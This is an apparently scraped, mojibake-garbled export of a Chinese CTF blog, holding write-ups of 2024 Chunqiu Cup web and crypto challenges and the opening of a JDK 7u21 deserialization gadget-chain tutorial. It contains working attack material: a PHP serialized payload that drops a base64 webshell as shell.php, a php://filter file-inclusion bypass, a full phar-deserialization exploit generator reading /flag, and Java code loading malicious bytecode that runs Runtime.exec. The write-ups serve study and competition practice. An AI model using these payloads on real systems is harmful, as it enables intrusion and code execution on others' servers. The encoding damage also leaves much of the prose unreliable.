O:3:\u0026#34;SDU\u0026#34;:1:{s:7:\u0026#34;Dazhuan\u0026#34;;O:3:\u0026#34;STU\u0026#34;:1:{s:3:\u0026#34;stu\u0026#34;;O:3:\u0026#34;CTF\u0026#34;:2:{s:7:\u0026#34;hackman\u0026#34;;s:24:\u0026#34;PD89YCRfR0VUWzBdYDs/Pg==\u0026#34;;s:8:\u0026#34;filename\u0026#34;;s:9:\u0026#34;shell.php\u0026#34;;}}} ç„¶åå°±æ˜¯æ‰“å°±è¡Œäº†ï¼Œä¼ å…¥æ•°æ®åè®¿é—®shell.phpæ–‡ä»¶ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œè¯»flagå³å¯ï¼š\nå¾—åˆ°flagã€‚\nb0okshelfã€day2ã€‘ è¯»ä¸‡å·ä¹¦ï¼Œè¡Œä¸‡é‡Œè·¯ã€‚è€å¸ˆæƒ³è®©ä½ åšä¸€ä¸ªå…±äº«å›¾ä¹¦å¹³å°ï¼Œä½†æ˜¯ä¸ºäº†å¼€æºèŠ‚æµï¼Œä¸é‡‡ç”¨æ•°æ®åº“ï¼Œä½ ç”¨äº†ä¸€äº›ç¥å¥‡çš„åŠæ³•â€¦â€¦\nâ€”â€”â€”â€”â€”â€”â€”â€”\nå¼€é¢˜ï¼Œè¿›è¡Œä¿¡æ¯æ”¶é›†ã€‚\nåç«¯æ˜¯phpï¼š\næ‰«ä¸€ä¸‹ç›®å½•ï¼š æ‰«åˆ°ä¸€ä¸ªbackup.zipå’Œä¸€ä¸ªrobots.txtï¼Œä½†æ˜¯robots.txtå…¶å®å°±æ˜¯è¯´çš„backup.zipæ–‡ä»¶ã€‚ä¸‹è½½è¿™ä¸ªbackup.zipæ–‡ä»¶ï¼Œé‡Œé¢å°±æ˜¯æºç ï¼Œç®€å•æ¥è¯´å°±æ˜¯å®¡è®¡æºç çš„æ“ä½œã€‚\næºç è¿˜æ˜¯æŒºç®€å•çš„ã€‚ç®€å•è¯´è¯´è€ƒç‚¹å§ï¼š\nå…ˆæ˜¯å­—ç¬¦ä¸²é€ƒé€¸ï¼ˆå¢å¤šï¼‰æ¥ä»»æ„å†™é©¬ï¼Œè¿ä¸Šæœ¨é©¬ï¼Œä½†æ˜¯æœ‰open_basedirçš„é™åˆ¶ã€‚å†ç„¶åè¿˜æœ‰disable_functionçš„é™åˆ¶ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨èšå‰‘å·¥å…·çš„fpmæ¥ç»•ï¼Œè¿˜å¯ä»¥ä½¿ç”¨CN-EXT (CVE-2024-2961)å¼¹ä¸ªshellæ¥ç»•ï¼Œè®°ä½å°±è¡Œã€‚è¿™é‡Œå°±æ³¨æ„ä¸€ä¸‹ï¼Œç»•è¿‡disable_funtionè¿˜æœ‰å…¶ä»–çš„æ–¹æ³•ã€‚\næœ€åæœ‰ä¸ªsudoçš„dateææƒã€‚\nç¯å¢ƒå…³äº†ï¼Œå…·ä½“è§£æ³•çœ‹å®˜æ–¹wpå§ï¼š\nã€Š2024æ˜¥ç§‹æ¯å†¬å­£èµ›ç¬¬äºŒå¤©é¢˜ç›®éƒ¨åˆ†è§£æã€‹\neasy_codeã€day3ã€‘ å°è¯•ç»•è¿‡å‘¢\né¢˜ç›®æç¤ºï¼šæ„é€ æ•´æ•°æº¢å‡ºï¼Œä»¥åŠphp://filterè¿‡æ»¤å™¨å»ç»•è¿‡è¯»å–read.php\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\næœ¬æ¥æ˜¯day2çš„é¢˜ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºå•¥åœ¨day2æœ€åå‡ å¤©æ’¤äº†æ”¾day3äº†ã€‚\nå¼€é¢˜ä¿¡æ¯æ”¶é›†æ‹¿åˆ°æ˜¯phpåç«¯ï¼Œç„¶åæ‰«ç›®å½•æ‰«å‡ºæ¥robots.txtæ–‡ä»¶ï¼Œé‡Œé¢é˜²çˆ¬gogogo.phpï¼Œè®¿é—®è¿™ä¸ªé¡µé¢ï¼Œå¾—åˆ°å¦‚ä¸‹phpä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 \u0026lt;?php header(\u0026#39;Content-Type: text/html; charset=utf-8\u0026#39;); highlight_file(__FILE__); $allowedFiles = [\u0026#39;read.php\u0026#39;, \u0026#39;index.php\u0026#39;]; $ctfer = $_GET[\u0026#39;ctfer\u0026#39;]?? null; if ($ctfer === null) { die(\u0026#34;error 0!\u0026#34;); } if (!is_numeric($ctfer)) { die(\u0026#34;error 1!\u0026#34;); } if ($ctfer!= 667) { die(\u0026#34;error 2!\u0026#34;); } //æº¢å‡º if (strpos(strval($ctfer), \u0026#39;7\u0026#39;)!== false) { die(\u0026#34;error 3!\u0026#34;); } $file = $_GET[\u0026#34;file\u0026#34;]; if ($_COOKIE[\u0026#39;pass\u0026#39;] == \u0026#34;admin\u0026#34;) { if (isset($file)) { // æ”¹è¿›çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ£€æŸ¥æ˜¯å¦ä¸å­˜åœ¨ base|rot13|input|data|flag|file|base64 å­—ç¬¦ä¸² if (preg_match(\u0026#34;/^(?:.*(?:base|rot13|input|data|flag|file|2|5|base64|log|proc|self|env).*)$/i\u0026#34;, $file)) { // å…ˆæ£€æŸ¥æ–‡ä»¶æ˜¯å¦åœ¨å…è®¸çš„åˆ—è¡¨ä¸­ echo \u0026#34;prohibited prohibited!!!!\u0026#34;; } else { echo \u0026#34;è¯•è¯•read.php\u0026#34;; include($file); } } } ?\u0026gt; è¯•è¯•read.php å‰é¢çš„æ•´æ•°ç»•è¿‡ä¸æ˜¯å¾ˆæ‡‚ï¼Œæœ¬æ¥ä»¥ä¸ºæ˜¯è€ƒçš„å¦‚ä¸‹æ–‡ç« çš„çŸ¥è¯†ç‚¹ï¼š\nã€ŠHackergame 2021 Webé¢˜2 å–ç“œ é¢˜è§£ï¼ˆPHPæ•´å‹æº¢å‡ºæ¼æ´ï¼‰ã€‹\nä½†æ˜¯æ²¡æ€ä¹ˆæ„é€ å‡ºæ¥ã€‚çœ‹äº†ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„wpï¼Œå¤§æ¦‚å°±æ˜¯phpä¸­å­˜åœ¨ä¸€ä¸ªæµ®ç‚¹ç²¾åº¦é—®é¢˜ï¼Œå½“æµ®ç‚¹ç²¾åº¦è¿‡é«˜ï¼Œä¼šå¯¼è‡´ä¸Šæº¢ã€‚æ‰€ä»¥è¿™é‡Œä½¿ç”¨ä¸‹é¢è¿™ä¸ªå¯ä»¥ç»•ï¼š\n1 ?ctfer=666.99999999999999999999999999 åé¢å°±æ˜¯ä¸€ä¸ªç®€å•çš„filterè¿‡æ»¤å™¨çš„åˆ©ç”¨ï¼Œç›´æ¥å¦‚ä¸‹è¯»å³å¯ï¼š\n1 ?ctfer=666.99999999999999999999999999\u0026amp;file=php://filter/convert.iconv.utf8.utf16/resource=read.php æ‹¿åˆ°read.phpæ–‡ä»¶å†…å®¹ï¼š\n1 \u0026lt;?php $flag = \u0026#34;ZmxhZ3tkOTFlYTIzZTkyN2IwZTJkY2E2NDYyNGNmNGM4NjdjYX0=\u0026#34; ?\u0026gt; æ‹¿å»è§£ç å¾—åˆ°flagï¼š\n1 flag{d91ea23e927b0e2dca64624cf4c867ca} â€”â€”â€”â€”â€”â€”\neasy_phpã€day3ã€‘ å¦‚ä½•è§¦å‘pharå‘¢\nâ€”â€”â€”â€”â€”â€”â€”â€”\nä¸å¤šè¯´ï¼Œå¾ˆåƒä¸€é“åŸé¢˜ï¼šSWPUCTF 2018]SimplePHP\næ”¹äº†ä¸€ç‚¹ã€‚ç»™äº†æºç ï¼Œä½†æ˜¯äº‹å…ˆæˆ‘æ˜¯ä¸çŸ¥é“çš„ï¼Œè¿™é‡Œå°±ç®€å•è®°å½•ä¸€ä¸‹è¸©çš„å‘ï¼Œé¦–å…ˆæ˜¯æ–‡ä»¶åçš„é—®é¢˜ï¼Œè¿™é‡Œæˆ‘åŸºç¡€ä¸ç‰¢ï¼ŒèŒƒäº†ä¸€ä¸ªéå¸¸åŸºç¡€çš„é”™è¯¯ï¼Œæºç ä¸­å¯¹ä¸Šä¼ çš„æ–‡ä»¶æœ‰å¦‚ä¸‹å¤„ç†ï¼š\n1 2 3 4 5 6 $filename = md5($_FILES[\u0026#34;file\u0026#34;][\u0026#34;name\u0026#34;].$_SERVER[\u0026#34;REMOTE_ADDR\u0026#34;]).\u0026#34;.jpg\u0026#34;; //mkdir(\u0026#34;upload\u0026#34;,0777); if(file_exists(\u0026#34;upload/\u0026#34; . $filename)) { unlink($filename); } move_uploaded_file($_FILES[\u0026#34;file\u0026#34;][\u0026#34;tmp_name\u0026#34;],\u0026#34;upload/\u0026#34; . $filename); å¯ä»¥çŸ¥é“æ˜¯å°†æ–‡ä»¶åé‡å†™å¹¶æŒ‡å®šäº†åç¼€ï¼Œè¿™é‡Œæ˜¯å°†ä¸Šä¼ çš„æ–‡ä»¶åï¼ˆæ¯”å¦‚shell.gifï¼‰å’Œè®¿é—®ipï¼ˆä½ çš„å¤–ç½‘Ipï¼‰æ‹¼æ¥ç„¶åmd5åŠ å¯†ç”Ÿæˆçš„æ–‡ä»¶åã€‚è¿™é‡Œä¸ºäº†è·å–åˆ°æ–‡ä»¶åå¡äº†å¾ˆä¹…ï¼Œä½†æ˜¯è¿™é‡Œåº”è¯¥è¦æ³¨æ„ä¸€ä¸ªä»£ç ï¼š\n1 mkdir(\u0026#34;upload\u0026#34;,0777); è™½ç„¶æ˜¯è¢«æ³¨é‡Šäº†çš„ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿæ˜¯å˜ç›¸è¡¨æ˜äº†ä¸€äº›ä¸œè¥¿ï¼Œè¿™é‡Œçš„uploadæ˜¯å¯ä»¥è®¿é—®çš„ï¼Œå°±ç®—æ˜¯www-dataæƒé™ã€‚æ‰€ä»¥è¿™é‡Œåœ¨ä¸Šä¼ äº†æ–‡ä»¶åæ˜¯å¯ä»¥çŸ¥é“æ–‡ä»¶åçš„ã€‚\nç¬¬äºŒä¸ªç‚¹å°±æ˜¯è¯»å–flagçš„åœ°æ–¹ï¼Œåœ¨file.phpä¸­ä¹Ÿæ˜¯æ³¨é‡Šäº†ä¸€ä¸ªä»£ç ï¼š\n1 #ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/var/www/html/phar2\u0026#39;); å°±æ˜¯å¯ä»¥è¯»å–ä»»ä½•ç›®å½•çš„æ–‡ä»¶ã€‚æºç ç»™äº†ä¸€ä¸ªå‡çš„flag.phpï¼ŒçœŸçš„æ˜¯åœ¨æ ¹ç›®å½•ä¸‹çš„/flagã€‚\næœ€åï¼Œè¿™é‡Œçš„ç”Ÿæˆpharçš„ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 \u0026lt;?php class Chunqiu { public $test; public $str; public function __destruct() { $this-\u0026gt;test = $this-\u0026gt;str; echo $this-\u0026gt;test; } } class Show { public $source; public $str; public function __toString() { $content = $this-\u0026gt;str[\u0026#39;str\u0026#39;]-\u0026gt;source; return $content; } public function __set($key,$value) { $this-\u0026gt;$key = $value; } public function _show() { if(preg_match(\u0026#39;/http|https|file:|gopher|dict|\\.\\.|f1ag/i\u0026#39;,$this-\u0026gt;source)) { die(\u0026#39;hacker!\u0026#39;); } else { highlight_file($this-\u0026gt;source); } } public function __wakeup() { if(preg_match(\u0026#34;/http|https|file:|gopher|dict|\\.\\./i\u0026#34;, $this-\u0026gt;source)) { echo \u0026#34;hacker~\u0026#34;; $this-\u0026gt;source = \u0026#34;index.php\u0026#34;; } } } class Test { public $file; public $params; public function __get($key) { return $this-\u0026gt;get($key); } public function get($key) { if(isset($this-\u0026gt;params[$key])) { $value = $this-\u0026gt;params[$key]; } else { $value = \u0026#34;index.php\u0026#34;; } return $this-\u0026gt;file_get($value); } public function file_get($value) { $text = base64_encode(file_get_contents($value)); return $text; } } $a=new Chunqiu(); $a-\u0026gt;str=new Show(); $a-\u0026gt;str-\u0026gt;str[\u0026#39;str\u0026#39;]=new Test(); $a-\u0026gt;str-\u0026gt;str[\u0026#39;str\u0026#39;]-\u0026gt;params[\u0026#34;source\u0026#34;]=\u0026#34;/flag\u0026#34;; $phar = new Phar(\u0026#34;phar.phar\u0026#34;); //.pharæ–‡ä»¶ï¼Œåç¼€åå¿…é¡»ä¸ºphar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER();\u0026lt;!-- ?\u0026gt;\u0026#34;); //è®¾ç½®stubï¼Œå›ºå®šçš„ $phar-\u0026gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest --è¿™é‡Œæ³¨æ„å˜é€š $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-\u0026gt;stopBuffering(); ?\u0026gt; ç”Ÿæˆçš„pharç„¶åæ”¹æˆgifåç¼€ä¸Šä¼ å³å¯ã€‚ç„¶åæ‹¿åˆ°æ–‡ä»¶åï¼Œä½¿ç”¨pharåè®®è§¦å‘å³å¯ã€‚\nå…¶ä»–wpå°±çœ‹çœ‹å®˜æ–¹wpå³å¯ï¼š\nã€Šæ˜¥ç§‹æ¯WP | 2024æ˜¥ç§‹æ¯å†¬å­£èµ›ç¬¬ä¸‰å¤©é¢˜ç›®éƒ¨åˆ†è§£æã€‹\ncrypto é€šå¾€å“ˆå¸Œçš„æ—…ç¨‹ åœ¨æ•°å­—åŸï¼Œå¤§å®¶éƒ½æ˜¯é€šè¿‡æ˜¯é€šè¿‡æ•°å­—ç”µè¯è¿›è¡Œçš„é€šä¿¡,å¸¸è§æ˜¯ä»¥188å¼€å¤´çš„11ä½çº¯è¡€å·ç ç»„æˆï¼Œäºšå†å±±å¤§æŠµåœ¨ä¸€ä¸ªç‰¹æ®Šçš„åœ°æ–¹æˆªè·ä¸€ä¸²ç‰¹æ®Šçš„å­—ç¬¦ä¸²\u0026quot;ca12fd8250972ec363a16593356abb1f3cf3a16d\u0026quot;ï¼Œé€šè¿‡æŸ¥é˜…å‘ç°è¿™ä¸ªè·Ÿä»¥å‰æ•£è½çš„å›½åº¦æœ‰ç‚¹ç›¸ä¼¼ï¼Œå¯èƒ½æ˜¯å»å¾€å“ˆå¸Œå›½åº¦çš„ã€‚å¹´è½»ç¨‹åºå‘˜äºšåŠ›å±±å¤§æŠµå¯¹è¿™ä¸ªå›½åº¦å……æ»¡å¥½å¥‡ï¼Œå†³å®šç ´è¯‘è¿™ä¸ªå“ˆå¸Œå€¼ã€‚åœ¨ç»è¿‡ä¸€æ®µæ—¶é—´çš„æ‘¸ç´¢åï¼ŒäºšåŠ›å±±å¤§æŠµå‡­å€Ÿå¼ºå¤§çš„ç¼–ç¨‹å®åŠ›æˆåŠŸç ´è§£ï¼Œåœ¨è¾“å…¥å¯¹åº”å­—ç¬¦ä¸²åç¬é—´è¢«ä¼ é€åˆ°ä¸€ä¸ªå¥‡å¹»çš„æ•°æ®ä¸–ç•Œï¼ŒåŒæ—¶äºšåŠ›å±±å¤§æŠµä¹Ÿå¼€å§‹äº†ä»–çš„è¿›ä¿®ä¹‹è·¯ã€‚(æäº¤æ ¼å¼ï¼šflag{11ä½å·ç }ï¼‰\nå“ˆå¸Œçˆ†ç ´ï¼Œè®©gptæ ¹æ®è¿™ä¸ªå†™ä¸ªè„šæœ¬å³å¯ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import hashlib def generate_hash(number): # å‡è®¾å“ˆå¸Œç®—æ³•æ˜¯SHA1 return hashlib.sha1(number.encode()).hexdigest() def crack_hash(target_hash): # ç”Ÿæˆæ‰€æœ‰11ä½çš„ç”µè¯å·ç  for i in range(18810000000, 18899999999): phone_number = str(i) # ç”Ÿæˆè¯¥ç”µè¯å·ç çš„å“ˆå¸Œå€¼ phone_hash = generate_hash(phone_number) # å¦‚æœå“ˆå¸Œå€¼åŒ¹é…ï¼Œåˆ™è¿”å›è¯¥ç”µè¯å·ç  if phone_hash == target_hash: return phone_number return None if __name__ == \u0026#34;__main__\u0026#34;: target_hash = \u0026#34;ca12fd8250972ec363a16593356abb1f3cf3a16d\u0026#34; result = crack_hash(target_hash) if result: print(f\u0026#34;flag{{{result}}}\u0026#34;) else: print(\u0026#34;æœªèƒ½æ‰¾åˆ°åŒ¹é…çš„ç”µè¯å·ç \u0026#34;) å¾—åˆ°flagï¼š\n1 flag{18876011645} ","date":"2025-01-22T14:20:20+08:00","permalink":"https://fupanc-w1n.github.io/p/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/","title":"2024æ˜¥ç§‹æ¯å†¬å­£èµ›"},{"content":"JDK 7u21 7u21è¿™æ¡é“¾ä¸éœ€è¦ä»»ä½•ä¾èµ–ï¼Œå®Œå…¨æ˜¯é  java åŸç”Ÿç±»æ¥è¿›è¡Œåˆ©ç”¨ã€‚\nå½±å“ç‰ˆæœ¬ï¼šJDK \u0026lt;= 7u21\næµ‹è¯•ç¯å¢ƒï¼š\nJDK 7u21 ideaéœ€è¦æ”¹é…ç½®ï¼Œæˆ‘å‰é¢éƒ½æ˜¯1.8ï¼Œè¿™é‡Œæ”¹æˆJDK7å³å¯ï¼ŒæŒ‰ç…§ä¸‹é¢è¿™ä¸ªæ–‡ç« æ¥è¯¥å³å¯ï¼š\nhttps://blog.csdn.net/qq_41813208/article/details/107784268\nhttps://blog.csdn.net/wz1509/article/details/141857535\nå‰ç½®è¯´æ˜ é“ºå« è¿™é‡Œçš„JDK7u21è¿˜æ˜¯åˆ©ç”¨çš„åŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼Œè¿™é‡Œå¯ä»¥è·å–åˆ°ä¸€ä¸ªç±»çš„æ–¹æ³•ï¼Œå…ˆç®€å•ç»™ä¸ªé“ºå«çŸ¥è¯†ï¼Œåœ¨å‰é¢CCé“¾çš„å­¦ä¹ å…¶å®ä¹Ÿç”¨è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥å¯ç”¨ä¸€æ¬¡åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„æ–¹æ³•æœ‰ï¼š\nnewTransformer()ï¼š getOutputProperties()ï¼š å…¶å®ç›´æ¥ç”¨getTransletInstance()æ–¹æ³•åº”è¯¥ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯ä¸æ˜¯å¾ˆå¥½åˆ©ç”¨ã€‚\nä¸Šé¢è¯´çš„ä¸¤ä¸ªæ–¹æ³•ä¹Ÿå®šä¹‰äºTemplates.javaæ¥å£ç±»ï¼Œå¦‚ä¸‹ï¼š ä¹Ÿæ˜¯å‰é¢ç”¨è¿‡çš„ã€‚\nAnnotationInvocationHandler åœ¨å‰é¢çš„CC1çš„LazyMapé“¾ä¸­ï¼Œå°±åˆ©ç”¨åˆ°äº†è¿™ä¸ªç±»ï¼Œåœ¨é‚£é‡Œåˆ©ç”¨åˆ°äº†è¿™ä¸ªç±»çš„invoke()æ–¹æ³•ï¼Œä¸ºäº†è°ƒç”¨åˆ°getæ–¹æ³•ï¼š\nä½†æ˜¯åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬è¦åˆ©ç”¨çš„æ˜¯è¿™ä¸ªç±»çš„equalsImpl()æ–¹æ³•ï¼ŒåŒæ ·çš„æ˜¯åœ¨è¿™ä¸ªç±»çš„invoke()æ–¹æ³•ä¸­åˆ©ç”¨ï¼Œå¦‚ä¸Šå›¾ç‰‡æ ‡æ³¨ã€‚\nequalsImpl() ç°åœ¨å†æ¥çœ‹è¿™ä¸ªequalsImpl()æ–¹æ³•ï¼š è¿™é‡Œè°ƒç”¨äº†invoke()æ–¹æ³•ï¼Œéœ€è¦var1ä¸æ˜¯AnnotationInvocationHandlerç±»å®ä¾‹å¹¶ä¸”éœ€è¦ä¸ºtypeå˜é‡çš„ä¸€ä¸ªç±»å®ä¾‹æ‰èƒ½è°ƒç”¨ï¼Œå†æ¥è·Ÿè¿›ä¸€ä¸‹å‰é¢var2çš„getMemberMethods()æ–¹æ³•ï¼š\nè¿™é‡Œå°±æ˜¯è·å–åˆ°typeå˜é‡é‡Œçš„æ–¹æ³•ï¼Œåœ¨AnnotationInvocationHandlerç±»çš„typeå˜é‡å®šä¹‰ï¼š\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå°„è·å–AnnotationInvocationHandlerç±»çš„æ„é€ æ–¹æ³•ï¼Œè¿™æ ·å°±å¯ä»¥ç»™è¿™ä¸ªå˜é‡å®šå€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•å°†è¿™é‡Œçš„typeå˜é‡èµ‹å€¼ä¸ºTemplates.classæ¥å£ç±»ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥è·å–åˆ°æƒ³åˆ©ç”¨çš„æ–¹æ³•ã€‚\nå‚è€ƒCC1ï¼Œç°åœ¨è¿™é‡Œå°±å¯ä»¥å†æ¬¡å°è¯•ä½¿ç”¨åŠ¨æ€ä»£ç†æ¥è°ƒç”¨åˆ°è¿™ä¸ªAnnotationInvocationHandlerç±»çš„invoke()æ–¹æ³•ï¼Œè¿›è€Œè¿›è¡Œå…¶ä»–æ“ä½œã€‚\nHashMap è¿™é‡Œä¸ºä»€ä¹ˆä¼šç”¨åˆ°HashMapå‘¢ï¼Œè¿™æ˜¯å› ä¸ºè¿™ä¸ªç±»çš„readObject()æ–¹æ³•ä¸­å¯¹ä»£ç†å¯¹è±¡è°ƒç”¨äº†å®ƒçš„æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š è¿›å…¥è¿™ä¸ªputForCreate()æ–¹æ³•ï¼š åªè¦æ»¡è¶³å‰é¢çš„æ¡ä»¶ï¼Œè¿™é‡Œå°±å¯ä»¥æˆåŠŸå¯¹è¿™ä¸ªkeyè°ƒç”¨equals()æ–¹æ³•ï¼Œåªè¦æˆ‘ä»¬å°†è¿™ä¸ªkeyè®¾ç½®ä¸ºAnnotationInvocationHandlerçš„ä»£ç†å¯¹è±¡ï¼Œå°±å¯ä»¥æˆåŠŸè°ƒç”¨åˆ°è¿™ä¸ªAnnotationInvocationHandlerç±»çš„invoke()æ–¹æ³•\nåŒç†æ„Ÿè§‰HashSetï¼ŒHashtableä¹Ÿèƒ½æ„é€ ï¼Œåªè¦èƒ½ä½¿è°ƒç”¨çš„æ–¹æ³•ä¸ºequals()æ–¹æ³•å³å¯è°ƒç”¨equalsImpl()æ–¹æ³•ï¼š ç®€å•è¯´æ˜ä¸€ä¸‹å‚æ•°é—®é¢˜ï¼škey.equals(k);ï¼Œå½“è·³è½¬åˆ°AnnotationInvocationHandlerç±»çš„invoke()æ–¹æ³•æ—¶ï¼Œè¿™é‡Œå¯¹åº”çš„å‚æ•°åˆ†åˆ«ä¸º\nvar2ï¼ˆæ–¹æ³•åï¼‰ï¼šequals va3ï¼ˆå‚æ•°ï¼‰ï¼šk æ‰€ä»¥ç»“åˆå‰é¢invoke()æ–¹æ³•ï¼Œè¿™é‡Œçš„kéœ€è¦ä¸ºTemplatesImplç±»çš„å®ä¾‹ï¼Œå¯¹åº”çš„å°±æ˜¯å‰ä¸€ä¸ªputè¿›çš„å€¼ï¼š\nè¿™å¼ å›¾è¯´çš„å¾ˆæ¸…æ¥šäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦putè¿›ä¸¤ä¸ªå€¼ï¼Œå¹¶ä¸”å‰ä¸€ä¸ªéœ€è¦ä¸ºtemplateImplç±»çš„å®ä¾‹ï¼Œå¦ä¸€ä¸ªä¸ºä»£ç†å¯¹è±¡ã€‚\nç°åœ¨å¯ä»¥æ•²å®šåŸºæœ¬æ¡†æ¶äº†ï¼Œå¤§æ¦‚æƒ³ä¸€ä¸‹æµç¨‹ï¼Œååºï¼š\næ”¾é”®å€¼å¯¹åˆ°å…¶ä¸­ã€‚ è°ƒç”¨åˆ°AnntationInvocationHandlerçš„invoke()æ–¹æ³• è°ƒç”¨equalsImpl()æ–¹æ³• è°ƒç”¨getMemberMethods()æ–¹æ³•è·å–åˆ°typeçš„classå¯¹è±¡ä¸­çš„æ–¹æ³•ã€‚ æ‰§è¡Œinvokeæ¥åŠ¨æ€åŠ è½½å­—èŠ‚ç  æ”»å‡»æ„é€  HashMap åŸºæœ¬ç›˜ï¼š\nTest.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package jdk.local; import java.io.IOException; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class Test extends AbstractTranslet { static { try { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } Main.javaï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package jdk.local; import java.nio.file.Files; import java.nio.file.Paths; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; public class Main{ public static void main(String[] main) throws Exception{ byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\jdk\\\\local\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } ç°åœ¨å°±æ˜¯çœ‹å¦‚ä½•å°†è¿™ä¸ªé…ç½®å¥½äº†çš„æ¶æ„å­—èŠ‚ç èƒ½è¢«åˆ©ç”¨åˆ°ã€‚\nååºåˆ—åŒ–éƒ¨åˆ† å…ˆä»ååºåˆ†æèµ·ï¼š\nè¿™é‡Œå°±æ˜¯ä»åºåˆ—åŒ–æ•°æ®ä¸­æå–å‡ºé”®å€¼ï¼Œç„¶åè°ƒç”¨putForCreate()æ–¹æ³•å°è¯•å°†å…¶æ”¾å…¥é”®å€¼è¡¨ä¸­ï¼Œç»§ç»­è·Ÿè¿›è¿™ä¸ªputForCeate()æ–¹æ³•ï¼š é‡ç‚¹è¿˜æ˜¯æ ‡æ³¨å‡ºæ¥çš„åœ°æ–¹ã€‚\né¦–å…ˆå°±æ˜¯hashå€¼çš„è®¾å®šï¼Œé‚£é‡Œçš„é€»è¾‘å°±æ˜¯å¦‚æœ keyä¸ºnullï¼Œé‚£ä¹ˆhashå€¼å°±ä¸º0ï¼Œå¦åˆ™å°±æ˜¯è°ƒç”¨hash()æ–¹æ³•æ¥è®¡ç®—keyçš„çš„å“ˆå¸Œå€¼ã€‚ è·Ÿè¿›ä¸€ä¸‹è¿™é‡Œçš„hash()æ–¹æ³•ï¼Œç®—æ³•å¦‚ä¸‹ï¼š\nå…¶æ¬¡å°±æ˜¯åé¢çš„ifæ¡ä»¶å†…çš„åˆ¤æ–­ã€‚javaä¸­çš„\u0026amp;\u0026amp;è¿ç®—ç¬¦ä¼šæŒ‰å‰åé¡ºåºæ‰§è¡Œï¼Œå¹¶ä¸”éœ€è¦å‰é¢çš„çœŸæ‰ä¼šæ‰§è¡Œåé¢ã€‚è€Œåé¢çš„||è¿ç®—ç¬¦åªè¦ä¸€ä¸ªä¸ºçœŸå³å¯ã€‚ æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦æ»¡è¶³å‰é¢çš„hashå€¼æ¡ä»¶ä¸ºçœŸã€‚å°±å¯ä»¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚\né—®é¢˜ä¸€ï¼ˆhashå€¼ï¼‰ hashå€¼ç›¸åŒçš„é—®é¢˜ã€‚\nç»“åˆå‰é¢çš„åˆ†æåŠCCé“¾çš„å­¦ä¹ ï¼Œæˆ‘ä»¬è¿™é‡Œéœ€è¦putè¿›ä¸¤ä¸ªå€¼ï¼Œå¹¶ä¸”ç¬¬äºŒä¸ªå€¼ä¸ºä¸€ä¸ªä»£ç†å¯¹è±¡ã€‚\nç°åœ¨æ¥çœ‹ä¸€ä¸‹hashå€¼çš„è®¡ç®—é—®é¢˜ã€‚å›åˆ°hashè®¡ç®—éƒ¨åˆ†ä»£ç 